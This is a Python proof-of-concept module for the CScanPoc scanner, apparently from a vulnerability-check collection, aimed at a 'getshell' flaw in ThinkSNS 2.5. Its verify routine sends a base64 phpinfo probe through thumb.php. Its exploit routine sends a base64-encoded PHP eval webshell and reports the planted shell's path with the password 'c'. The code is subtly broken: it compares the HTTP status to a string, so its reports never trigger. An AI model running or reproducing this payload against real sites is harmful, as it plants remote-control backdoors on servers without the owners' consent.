# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'ThinkSNS_0002'  # 平台漏洞编号，留空
    name = 'ThinkSNS 2.5 getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2012-07-10'  # 漏洞公布时间
    desc = '''
        ThinkSNS开源社交网站APP系统,含微博,论坛,问答,即时聊天,资讯CMS,投票,礼物商城,商城等功能应用。
        Thinksns 2.5 getshell漏洞。
    '''  # 漏洞描述
    ref = 'http://blog.sina.com.cn/s/blog_a5cc961a01016ebb.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkSNS'  # 漏洞应用名称
    product_version = 'ThinkSNS 2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5e33cfd1-ca0c-47f4-85bf-fae83a317dff'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/thumb.php?url=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4&w=&t=.php&r=1"
            url = self.target + payload
            r = requests.get(url)

            if r.status_code == '200':
                if r.text.find('System') != -1:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/thumb.php?url=data://text/plain;base64,PD9waHAgaWYoJF9QT1NUW2NdKXtldmFsKCRfUE9TVFtjXSk7fWVsc2V7cGhwaW5mbygpO30/Pg==&w=&t=.php&r=1"
            url = self.target + payload
            r = requests.get(url)
            verify_url = self.target + \
                '/data/thumb/44/ed/44ed1732a7e550e7a8874943fc774bad_100_100_.php'

            if r.status_code == '200':
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
